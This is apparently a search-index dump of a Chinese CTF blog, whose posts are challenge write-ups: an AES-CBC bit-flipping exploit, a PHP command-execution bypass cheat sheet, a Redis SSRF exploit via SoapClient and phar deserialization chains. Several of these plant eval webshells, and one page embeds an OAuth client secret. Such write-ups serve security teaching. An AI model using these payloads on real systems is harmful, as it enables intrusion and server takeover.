{"pages":[{"title":"","text":"🚩 A CTFer 💖 ACGN 🖥️ Web 2.0 &amp; Web .03 🪗 Smart Contract My Skill Set Frontend Backend DevOps Connect with me About My Username这不得不得提起我的高中生活了。高一军训的时候，教官叫我小胖，于是我同学就开始叫我阿胖。我的高中英语老师普通话不标准，掺杂着一股浓烈的方言味道，甚至英文单词都有一股浓烈的“地方特色”，有一天，他读课文，兴致正浓，刚好读到了一句话，恰巧这句话里又有一个upon，而这个upon他又专门停顿一下，重(zhong)读。当时，一股雄厚无比而又夹杂着方言味道的声浪袭来，之后我同学都管我叫upon了。 至于后面的数字，俺比较懒，哪年注册的后面就写的哪年，当然也有特例，就是2016，这个代表的不是2016年，而是指比特币每2016个区块会变更一次挖矿难度，在一些与区块链有关的社区，我注册的id大多是UPON-2016","link":"/about/index.html"},{"title":"","text":"你似乎来到了世界的尽头","link":"/album/index.html"},{"title":"","text":"友情链接还在添加中qwq 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/message/index.html"},{"title":"音乐歌单收藏","text":"温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/media/index.html"},{"title":"","text":"碎碎念 tips：github登录后按时间正序查看、可点赞加❤️、本插件地址..「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"}],"posts":[{"title":"Round 6复现","text":"Web check(V1)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# -*- coding: utf-8 -*-from flask import Flask,requestimport tarfileimport osapp = Flask(__name__)app.config['UPLOAD_FOLDER'] = './uploads'app.config['MAX_CONTENT_LENGTH'] = 100 * 1024ALLOWED_EXTENSIONS = set(['tar'])def allowed_file(filename): return '.' in filename and \\ filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/')def index(): with open(__file__, 'r') as f: return f.read()@app.route('/upload', methods=['POST'])def upload_file(): if 'file' not in request.files: return '?' file = request.files['file'] if file.filename == '': return '?' print(file.filename) if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename: file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename) if(os.path.exists(file_save_path)): return 'This file already exists' file.save(file_save_path) else: return 'This file is not a tarfile' try: tar = tarfile.open(file_save_path, &quot;r&quot;) tar.extractall(app.config['UPLOAD_FOLDER']) except Exception as e: return str(e) os.remove(file_save_path) return 'success'@app.route('/download', methods=['POST'])def download_file(): filename = request.form.get('filename') if filename is None or filename == '': return '?' filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename) if '..' in filename or '/' in filename: return '?' if not os.path.exists(filepath) or not os.path.isfile(filepath): return '?' with open(filepath, 'r') as f: return f.read() @app.route('/clean', methods=['POST'])def clean_file(): os.system('/tmp/clean.sh') return 'success'if __name__ == '__main__': app.run(host='0.0.0.0', debug=True, port=80) 管他那么多，先整一个上传页面 1234&lt;form id=&quot;upload-form&quot; action=&quot;http://1.14.71.254:28597/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt; &lt;input type=&quot;file&quot; id=&quot;upload&quot; name=&quot;upload&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload&quot; /&gt;&lt;/form&gt;","link":"/2022/10/18/Round6/"},{"title":"CBC反转攻击详解","text":"0x00 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Login Form&lt;/title&gt;&lt;link href=&quot;static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;$(document).ready(function() { $(&quot;.username&quot;).focus(function() { $(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;); }); $(&quot;.username&quot;).blur(function() { $(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;); }); $(&quot;.password&quot;).focus(function() { $(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;); }); $(&quot;.password&quot;).blur(function() { $(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;); });});&lt;/script&gt;&lt;/head&gt;&lt;?phpdefine(&quot;SECRET_KEY&quot;, '9999999999999999');define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv(){ $random_iv=''; for($i=0;$i&lt;16;$i++){ $random_iv.=chr(rand(1,255)); } return $random_iv;}function login($info){ $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher));}function check_login(){ if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv'])){ $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){ $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode('&quot;.base64_encode($plain).&quot;') can't unserialize&lt;/p&gt;&quot;); $_SESSION['username'] = $info['username']; }else{ die(&quot;ERROR!&quot;); } }}function show_homepage(){ if ($_SESSION[&quot;username&quot;]==='admin'){ echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is ctf{123cbcchange}&lt;/p&gt;'; }else{ echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; } echo '&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;';}if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){ $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin'){ exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); }else{ $info = array('username'=&gt;$username,'password'=&gt;$password); login($info); show_homepage(); }}else{ if(isset($_SESSION[&quot;username&quot;])){ check_login(); show_homepage(); }else{ echo '&lt;body class=&quot;login-body&quot;&gt; &lt;div id=&quot;wrapper&quot;&gt; &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt; &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt; &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;header&quot;&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\\'\\'&quot; /&gt; &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\\'\\'&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; }}?&gt;&lt;/html&gt; 0x01 AES-CBC 加密、解密过程加密过程 Plaintext：明文数据 IV：初始向量 Key：分组加密使用的密钥 Ciphertext：密文数据 明文都是先与混淆数据（第一组是与IV，之后都是与前一组的密文）进行异或，再执行分组加密的。 123456781、首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。2、生成一个随机的初始化向量(IV)和一个密钥。3、将IV和第一组明文异或。4、用密钥对3中xor后产生的密文加密。5、用4中产生的密文对第二组明文进行xor操作。6、用密钥对5中产生的密文加密。7、重复4-7，到最后一组明文。8、将IV和加密后的密文拼接在一起，得到最终的密文。 解密过程：每组解密时，先进行分组加密算法的解密，然后与前一组的密文进行异或才是最初的明文。 对于第一组则是与IV进行异或。 12341、从密文中提取出IV，然后将密文分组。2、使用密钥对第一组的密文解密，然后和IV进行xor得到明文。3、使用密钥对第二组密文解密，然后和2中的密文xor得到明文。4、重复2-3，直到最后一组密文。 0x02 攻击异或的特性:异或是不进位加法 1231⊕1=0 //这里1+1=10 进位了，不需要管他1⊕0=10⊕1=1 连续异或两次同一个内容，就相当于没有异或 比如:1100110 ⊕1010100⊕1010100 = 1100110 而异或还有交换律,可以随意打乱顺序 1010100 ⊕ 1100110 ⊕1010100 = 1100110 1.对于解密时：设明文为X，密文为Y，解密函数为k。 X[i] = k(Y[i]) Xor Y[i-1] 2.字节翻转要改变Cipher1[0]的值为x 则 'a' ^ x = decrypt(cipher2[0]) 而又因为：Plain2[0] ^ Cipher1[0]=decrypt(cipher2[0]) 把decrypt(cipher2[0]) 代入第一个式子得 'a' ^ x = Plain2[0] ^ Cipher1[0] 解得x= Plain2[0] ^ Cipher1[0] ^ 'a' x是我们要赋值的，也就是Cipher1[0] ，所以最后写出的语句为： Cipher1[0]=Plain2[0] ^ Cipher1[0] ^ 'a' Plain2[0]是原明文组2的第一个字节（已知），Cipher1[0]是第一组密文的第一个字节（已知） 此时再把Cipher1和Cipher2连接起来生成Ciphertext，把C，就会成功变成我们想要的明文。 3.修复IV：当我们破坏掉密文的第一组时，同样明文的第一组在解密的时候就并不是原来的明文了，这个时候我们需要修复初始向量IV，给它一个新的值， 使NewIv ^ NewCipher1 = Plain1（原） 推导过程： Plain1(损坏) ^ iv = decrypt(newCipher1) Newiv=Plain1(原) ^ decrypt(newCipher1) （目的是要给Newiv赋值） 把第一个式子代入到第二个式子中得到：（此时Plain(原) 已知，Plain1(损坏)已知） Newiv=Plain1(原) ^ Plain1(损坏) ^ iv 有了Newiv和翻转好的Ciphertext，这时网站后端解密后的明文就是我们构造好的明文了。 0x03 例题 只有admin才能看flag，而登陆的时候过滤了admin。后端检测的时候使用的是cookie里面的cipher以及iv解密后得到的字符进行反序列化 原文:a:2:{s:8:&quot;username&quot;;s:5:&quot;admix&quot;;s:8:&quot;password&quot;;s:5:&quot;admix&quot;;} cipher:540LbV57RP5K18c1jJeAOk7HOjcMLHthWSvcLRPMmOTUdyvcS8NkZsx%2BjR7cIgNOqIURlke333VwZ8Tv0Ajpkg== iv:Ne%2BoeXNBcE%2BuI%2BCrlXqjqw%3D%3D 这里cookie可控。 明文加密时分组为: 1234a:2:{s:8:&quot;username&quot;;s:5:&quot;admix&quot;;s:8:&quot;password&quot;;s:2:&quot;123&quot;;} 这里只需要把admix的x反转成n就行了 12345678910111213141516171819202122232425262728293031323334#-*- coding:utf8 -*-import base64import urllib.parse# a:2:{s:8:&quot;userna# me&quot;;s:5:&quot;admiN&quot;;# s:8:&quot;password&quot;;s# :6:&quot;123&quot;;} #原始cipherciphertext = 'w1uvgfzxxuYHA%2Bo08ZL%2BCefhwr2jHuwglOIBAh8cP1w5TCiCmY0Yy%2BQxelAl9%2B%2FiZeRvLD7UjzlF58bTGFZ%2BWQ%3D%3D'cipher = base64.b64decode(urllib.parse.unquote(ciphertext))array_cipher = bytearray(cipher)array_cipher[13] = array_cipher[13]^ ord('N') ^ ord('n')#print(array_cipher)print('newCipher:',urllib.parse.quote(base64.b64encode(array_cipher)))#解密后的明文base64decode_plain = base64.b64decode('sxvY7wUlyPgC+/iV7InfjG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==')#原始iviv = base64.b64decode(urllib.parse.unquote('1HxERxo2%2FTuymbrPoVDB%2Bw%3D%3D'))#原始明文plain = 'a:2:{s:8:&quot;userna'newiv = list(iv)for i in range(16): newiv[i] = (ord(plain[i].encode('utf-8')) ^ iv[i] ^ decode_plain[i])newiv = bytes(newiv)print('newiv:',urllib.parse.quote(base64.b64encode(newiv))) 小饼干一换就行了。 0x04 RefenceCBC字节翻转攻击解析 [CTF]AES-CBC字节翻转攻击","link":"/2022/11/21/cbc/"},{"title":"命令执行备忘录","text":"0x00 什么是RCERCE又称远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 0x01 常见命令执行函数12PHP代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()... 12PHP命令执行函数：system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()... 0x02 Bypass1.关键词拦截: 关键词替换为空的情况: 双写绕过，比如cacatt -&gt; cat 仅拦截关键字: 使用其他函数，比如拦截cat的时候，可以使用其他命令。 Input Ouput static-sh ./flag.txt ./flag.txt: line 1: flag{this_is_a_test}: not found paste ./flag.txt /etc/passwd flag{this_is_a_test} root:x:0:0:root:/root:/bin/bash… diff diff ./flag.txt /etc/passwd curl file:///home/coffee/flag flag{this_is_a_test} … … 通配符绕过，比如可以使用/b??/c?t f*。该方法有时候会因为输出过多或者运行时间超出限制被强行中断 插入&quot;&quot; &lt;&gt; '' \\绕过,比如ca''t flag.txt或者ca\\t flag.txt 内联执行，将反引号内命令的输出作为输入执行,如: cat `ls`，或者是cat ${ls} 使用变量替换，如$c=a;cat fl$cg.php 拦截空格,空格可以用以下字符串代替： &lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等，比如: 123456cat%09flag{cat,flag.txt}cat${IFS}flag.txtcat$IFS$9flag.txtcat&lt;flag.txt cat&lt;&gt;flag.txt .操作符 eval函数中用.把被拦截的关键字给分开，比如 12&lt;?php eval(include &quot;/www/lo&quot;.&quot;g/nginx/access.log&quot;); 逃逸，绕过太难了，直接润出来比如 12c=include$_GET[1]?&gt; c=eval($_GET[1]) 借壳生蛋 12345678&lt;?php $env = $_GET['env']; if(isset($env)){ putenv($env); system(&quot;whoami&quot;); }else{ highlight_file(__FILE__); } ?env=BASH_FUNC_whoami%%=() { ls; }whoami是system(“whoami”)启动的bash环境的函数，相当于我们注册了一个whoami替换它 构造 在PHP7中，可以这样调用函数: 123('phpinfo')();$a = &quot;phpinfo&quot;;$$a;... 然后就可以使用异或^,取反~，自增++，自减--等方法构造想要的字符然后进行动态函数调用。 构造字符的时候，可以利用一些PHP的特性： PHP中的NAN和INF： 123456NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。$_=C/C;//NAN$_=1/C//INF 2.无回显 利用sleep()之类的函数来根据服务器响应的时间一个一个字符获获取注:该方法局限性很大，且容易受到网络波动影响，不建议优先考虑使用 利用dns外带http://dnslog.cn/注:该方法也有一定的局限性，有长度限制而且不支持特殊字符 利用重定向，将输出重定向到可访问网页中 反弹shell如果题目不出网只能寄 命令注入,尝试在命令后面加上||、%0a、%0d、|、;、&amp;等符号将原先重定向到/dev/null的命令分割开 3.include 伪协议 日志包含UA写马,包含access.log allow_url_include=ture可以使用的data123456789101112131415data类型扩展: data类型扩展 data:,&lt;文本数据&gt; data:text/plain,&lt;文本数据&gt; data:text/html,&lt;HTML代码&gt; data:text/html;base64,&lt;base64编码的HTML代码&gt; data:text/css,&lt;CSS代码&gt; data:text/css;base64,&lt;base64编码的CSS代码&gt; data:text/javascript,&lt;Javascript代码&gt; data:text/javascript;base64,&lt;base64编码的Javascript代码&gt; data:image/gif;base64,base64编码的gif图片数据 data:image/png;base64,base64编码的png图片数据 data:image/jpeg;base64,base64编码的jpeg图片数据 data:image/x-icon;base64,base64编码的icon图片数据 Tips: PHP具有极强的鲁棒性特别耐操，尤其是伪协议这块。1234567原payload:php://filter/convert.base64-encode/resource=index.php我可以插♂ 入一些奇怪的东西php://filter/convert.base64-encode/114514/resource=index.php我可以大大小小php://FiLTer/convert.base64-encode/resource=index.php 4.无参命令执行这种就基本没活能整了，已经十分固定下来了 123456&lt;?phphighlight_file(__FILE__);if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { eval($_GET['code']);}?&gt; '/[^\\W]+\\((?R)?\\)/'的解释 这里使用pregreplace替换匹配到的字符为空，\\w匹配字母、数字和下划线，等价于 [^A-Za-z0-9]，然后(?R)?这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有; 以上正则表达式只匹配a(b(c()))或a()这种格式，不匹配a(“123”)，也就是说我们传入的值函数不能带有参数，所以我们要使用无参数的函数进行文件读取或者命令执行。 一些有用的东西 12345678910111213141516171819202122目录操作：getchwd() ：函数返回当前工作目录。scandir() ：函数返回指定目录中的文件和目录的数组。dirname() ：函数返回路径中的目录部分。chdir() ：函数改变当前的目录。数组相关的操作：end() - 将内部指针指向数组中的最后一个元素，并输出。next() - 将内部指针指向数组中的下一个元素，并输出。prev() - 将内部指针指向数组中的上一个元素，并输出。reset() - 将内部指针指向数组中的第一个元素，并输出。each() - 返回当前元素的键名和键值，并将内部指针向前移动。array_shift() - 删除数组中第一个元素，并返回被删除元素的值。读文件show_source() - 对文件进行语法高亮显示。readfile() - 输出一个文件。highlight_file() - 对文件进行语法高亮显示。file_get_contents() - 把整个文件读入一个字符串中。readgzfile() - 可用于读取非 gzip 格式的文件 PAYLOAD 请求头 123GET /1.php?code=eval(end(getallheaders())); HTTP/1.1.....flag: system('id'); get_defined_vars() 1?code=eval(end(current(get_defined_vars())));&amp;flag=system('ls'); 利用全局变量进RCE get_defined_vars()：返回由所有已定义变量所组成的数组，会返回 _GET,_POST, _COOKIE, _FILES全局变量的值，返回数组顺序为get-&gt;post-&gt;cookie-&gt;filescurrent：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回$_GET变量的数组值 3.session_start() session_start()：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id() session_id()：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。文件读取 show_source(session_id(session_start())); var_dump(file_get_contents(session_id(session_start()))) highlight_file(session_id(session_start())); readfile(session_id(session_start()));抓包传入Cookie: PHPSESSID=(想读的文件)即可","link":"/2022/10/03/RCE/"},{"title":"DasCTF 十月月赛复现","text":"寄寄寄！四道题，三道我不擅长的反序列化，寄，当时还要考试复习，结果没太多时间做，麻了都。 EasyPop这题链子好找，也很快就找到了，但问题就在于最后一步如何绕过__wakeup，麻了，我就卡在这里了…….PHP序列化冷知识 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&lt;?phphighlight_file(__FILE__);error_reporting(0);class fine{private $cmd;private $content;public function __construct($cmd, $content){$this-&gt;cmd = $cmd;$this-&gt;content = $content;}public function __invoke(){call_user_func($this-&gt;cmd, $this-&gt;content);}public function __wakeup(){$this-&gt;cmd = &quot;&quot;;die(&quot;Go listen to Jay Chou's secret-code! Really nice&quot;);}}class show{public $ctf;public $time = &quot;Two and a half years&quot;;public function __construct($ctf){$this-&gt;ctf = $ctf;}public function __toString(){return $this-&gt;ctf-&gt;show();}public function show(): string{return $this-&gt;ctf . &quot;: Duration of practice: &quot; . $this-&gt;time;}}class sorry{private $name;private $password;public $hint = &quot;hint is depend on you&quot;;public $key;public function __construct($name, $password){$this-&gt;name = $name;$this-&gt;password = $password;}public function __sleep(){$this-&gt;hint = new secret_code();}public function __get($name){$name = $this-&gt;key;$name();}public function __destruct(){if ($this-&gt;password == $this-&gt;name) {echo $this-&gt;hint;} else if ($this-&gt;name = &quot;jay&quot;) {secret_code::secret();} else {echo &quot;This is our code&quot;;}}public function getPassword(){return $this-&gt;password;}public function setPassword($password): void{$this-&gt;password = $password;}}class secret_code{protected $code;public static function secret(){include_once &quot;hint.php&quot;;hint();}public function __call($name, $arguments){$num = $name;$this-&gt;$num();}private function show(){return $this-&gt;code-&gt;secret;}}if (isset($_GET['pop'])) {$a = unserialize($_GET['pop']);$a-&gt;setPassword(md5(mt_rand()));} else {$a = new show(&quot;Ctfer&quot;);echo $a-&gt;show();} hade_waibo进来一看，cancan need任意文件读取，把文件全扒下来，核心实在class.php里面，肯定是phar反序列化。乍一看，又要绕wakeup，不过这一次有引用赋值，可以绕，当时没时间了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?phpclass User{ public $username; public function __construct($username){ $this-&gt;username = $username; $_SESSION['isLogin'] = True; $_SESSION['username'] = $username; } public function __wakeup(){ $cklen = strlen($_SESSION[&quot;username&quot;]); if ($cklen != 0 and $cklen &lt;= 6) { $this-&gt;username = $_SESSION[&quot;username&quot;]; } } public function __destruct(){ if ($this-&gt;username == '') { session_destroy(); } }}class File{ #更新黑名单为白名单，更加的安全 public $white = array(&quot;jpg&quot;,&quot;png&quot;); public function show($filename){ echo '&lt;div class=&quot;ui action input&quot;&gt;&lt;input type=&quot;text&quot; id=&quot;filename&quot; placeholder=&quot;Search...&quot;&gt;&lt;button class=&quot;ui button&quot; onclick=&quot;window.location.href=\\'file.php?m=show&amp;filename=\\'+document.getElementById(\\'filename\\').value&quot;&gt;Search&lt;/button&gt;&lt;/div&gt;&lt;p&gt;'; if(empty($filename)){die();} return '&lt;img src=&quot;data:image/png;base64,'.base64_encode(file_get_contents($filename)).'&quot; /&gt;'; } public function upload($type){ $filename = &quot;dasctf&quot;.md5(time().$_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.$type&quot;; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $filename); return &quot;Upload success! Path: upload/&quot; . $filename; } public function rmfile(){ system('rm -rf /var/www/html/upload/*'); } public function check($type){ if (!in_array($type,$this-&gt;white)){ return false; } return true; }}#更新了一个恶意又有趣的Test类class Test{ public $value; public function __destruct(){ chdir('./upload'); $this-&gt;backdoor(); } public function __wakeup(){ $this-&gt;value = &quot;Don't make dream.Wake up plz!&quot;; } public function __toString(){ $file = substr($_GET['file'],0,3); file_put_contents($file, &quot;Hack by $file !&quot;); return 'Unreachable! :)'; } public function backdoor(){ if(preg_match('/[A-Za-z0-9?$@]+/', $this-&gt;value)){ $this-&gt;value = 'nono~'; } system($this-&gt;value); }} 官方exp 123456789101112131415161718192021222324class User{public $username;}class Test{public $value;}$User = new User();$Test = new Test();$User-&gt;a = $Test;$User-&gt;username = &amp;$Test-&gt;value;echo serialize($User);#第二步，需要把name改成* /*// $Test-&gt;a = $User;// $User-&gt;username = $Test;// echo serialize($Test);#第一步，需要把名字改成数组$phar = new \\Phar(&quot;h3ne1.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt; addFromString('test.txt','h3en1');//$phar-&gt;setMetadata($Test);第一步$phar-&gt;setMetadata($User);$phar-&gt;stopBuffering(); 因为给实验室的新生配web靶机的docker环境，当时就顺手看看有没有start.sh或者flag.sh文件，然后就还真找到了 事实证明，docker运行之后，要删除的不只有环境变量，还有运行的sh脚本，谨防露牛子 start.sh 1234567#!/bin/shecho $FLAG &gt; /ghjsdk_F149_H3re_asdasfcexport FLAG=no_flagFLAG=no_flagapache2-foregroundrm -rf /flag.shtail -f /dev/null 直接露牛子了吧 EasyLove当时急着复习，这题我没看了….寄 123456789101112131415161718192021222324252627282930313233343536 &lt;?phphighlight_file(__FILE__);error_reporting(0);class swpu{ public $wllm; public $arsenetang; public $l61q4cheng; public $love; public function __construct($wllm,$arsenetang,$l61q4cheng,$love){ $this-&gt;wllm = $wllm; $this-&gt;arsenetang = $arsenetang; $this-&gt;l61q4cheng = $l61q4cheng; $this-&gt;love = $love; } public function newnewnew(){ $this-&gt;love = new $this-&gt;wllm($this-&gt;arsenetang,$this-&gt;l61q4cheng); } public function flag(){ $this-&gt;love-&gt;getflag(); } public function __destruct(){ $this-&gt;newnewnew(); $this-&gt;flag(); }}class hint{ public $hint; public function __destruct(){ echo file_get_contents($this-&gt; hint.'hint.php'); }}$hello = $_GET['hello'];$world = unserialize($hello); 这回链子很短，先看hint 1234567&lt;?phpclass hint{public $hint=&quot;php://filter/read=convert.base64-encode/resource=&quot;;}$a = new hint();echo serialize($a);?&gt; 获得账号密码 123&lt;?php$hint = &quot;My favorite database is Redis and My favorite day is 20220311&quot;;? 很明显，利用SoapClient进行ssrf然后打redis 寄，还是不会这里也看一下怎么打redis 这里比较有趣的是，当我们利用ssrf向redis发起http请求时，低版本的Redis会将请求头的内容作为redis命令解析，那么只要我们通过CRLF控制住请求头，再配合SoapClient发起请求即可，故exp如下： 12345678910111213141516171819202122&lt;?php$target='http://127.0.0.1:6379/';$poc0=&quot;AUTH 20220311&quot;;$poc=&quot;CONFIG SET dir /var/www/html&quot;;$poc1=&quot;SET x '&lt;?@eval(\\$_POST[1]);?&gt;'&quot;;$poc2=&quot;CONFIG SET dbfilename cmd.php&quot;;$poc3=&quot;SAVE&quot;;$a = array('location' =&gt; $target,'uri' =&gt;'hello^^'.$poc0.'^^'.$poc.'^^'.$poc1.'^^'.$poc2.'^^'.$poc3.'^^hello');$aaa = serialize($a);$aaa = str_replace('^^',&quot;\\r\\n&quot;,$aaa);$c=unserialize($aaa);class swpu{public $wllm = 'SoapClient';public $arsenetang = null;public $l61q4cheng;public $love;}$a=new swpu();$a-&gt;l61q4cheng=$c;echo urlencode(serialize($a));?&gt; 确实要学学Redis咋用了，这都看不懂 BlogSystem这是个好题，我慢慢品一品再来做,太多涉及到我知识盲区的东西了","link":"/2022/10/28/das10%E5%A4%8D%E7%8E%B0/"},{"title":"美团CTF决赛复现 mako","text":"太菜了，被大佬带进决赛了,最后就签个到 环境密码:1skr 下面部分是我在比赛的时候思考过的 1.开始页面一进来，十分的清爽，毛都没有，就一个上传文件的东西 随便传点东西，发现是来者不拒，啥都能传，但啥都干不了访问1.php只会出现404not found这是最令人异或的一点 因为题目给了docker，就本地部署一个环境，先进去看看文件都存到了哪里可以看见，文件并没有被上传到/var/www/html/这个目录下面 而文件被上传到了/var/www/html/mako/uploads这个目录下 可以肯定的是，文件上传是整不了活了 2.审计通过搜索关键词，在mako/app/reources/views/home.tpl.php里找到到了首页的源码 很明显，这是用模版渲染出来的主页, 图片都是以base64的编码形式传递的，没活整了。 这就很令人苦恼，我当时尝试了一下，使用软链接 直接寄了，没权限，这时候才想起来容器一开始写了一个读取flag的程序 目标也明确了，肯定得想办法执行readFlag，于是我搜了危险函数，然后是一无所获，要么没这个函数，要么根本无法触发 做到这里，我已经没有思路了，当时想到了反序列化，但是只知道搜unseralize，结果是毛都没搜到。 我经验太少了，当时没想到用phar 3.复现在mako/app/controllers/ImagesController.php文件中 123456789public function editGet(ViewFactory $view): string { chdir('/var/www/mako/uploads'); $fileName = $this-&gt;request-&gt;getQuery()-&gt;get('filename'); $image = new Image($fileName, new ImageMagick()); $dimensions = $image-&gt;getDimensions(); $this-&gt;view-&gt;assign('fileName', $fileName); $this-&gt;view-&gt;assign('dimensions', $dimensions); return $view-&gt;render('edit');} 可以看到，文件名是不做任何过滤的 而在mako/vendo/mako/framework/src/mako/pixl/image.php中 1234567891011121314151617public function __construct($image, ProcessorInterface $processor){ $this-&gt;image = $image; $this-&gt;processor = $processor; // Make sure that the image exists if(file_exists($this-&gt;image) === false) { throw new PixlException(vsprintf('The image [ %s ] does not exist.', [$this-&gt;image])); } // Set the image $this-&gt;processor-&gt;open($image);} 使用了能触发phar反序列化的file_exists函数 关键函数找到了，现在找链子吧 搜索__destruct(),干扰项不多，可以直接开撸 好家伙，我直接好家伙，一条龙服务了属于是qwq 4.攻击这里搬一手Arr3stY0u战队的poc吧 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpnamespace mako\\file{class FileSystem{}}namespace mako\\session\\stores{ use mako\\file\\FileSystem;class File{ protected $fileSystem; protected $sessionPath; public function __construct(){ $this-&gt;fileSystem = new FileSystem(); $this-&gt;sessionPath = '/var/www/mako/public/'; }}}namespace mako\\session{use mako\\session\\stores\\File;class Session{ protected $autoCommit; protected $destroyed = false; protected $sessionId; protected $sessionData = []; protected $store; public function __construct(){ $this-&gt;autoCommit = true; $this-&gt;destroyed = false; $this-&gt;store = new File(); $this-&gt;sessionId = 'shell.php'; $this-&gt;sessionData = ['a'=&gt;'&lt;?php eval($_POST[1]);?&gt;']; }}}namespace { $exp = new mako\\session\\Session(); $phar = new Phar('test.phar',0,'test.phar'); $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php 